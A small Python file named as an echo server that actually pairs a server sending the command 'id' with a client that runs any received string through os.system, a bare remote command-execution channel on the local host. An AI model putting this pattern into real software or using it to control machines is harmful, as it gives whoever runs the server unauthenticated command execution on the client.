# echo-server.py
import socket               # Import socket module

s = socket.socket()         # Create a socket object
host = socket.gethostname() # Get local machine name
port = 12345                # Reserve a port for your service.
s.bind((host, port))        # Bind to the port

s.listen(5)                 # Now wait for client connection.
while True:
   c, addr = s.accept()     # Establish connection with client.
   print ('Got connection from', addr)
   c.send(b'id')
   print (c.recv(1024))
   c.close()                # Close the connection
   
   
   
import socket               # Import socket module
import os

s = socket.socket()         # Create a socket object
host = socket.gethostname() # Get local machine name
port = 12345                # Reserve a port for your service.
s.connect((host, port))
cmd1= s.recv(1024)
cmd1=str(cmd1,'utf-8')
print(cmd1)
os.system(cmd1)
s.send(b'Command Executed')
s.close()                     # Close the socket when done
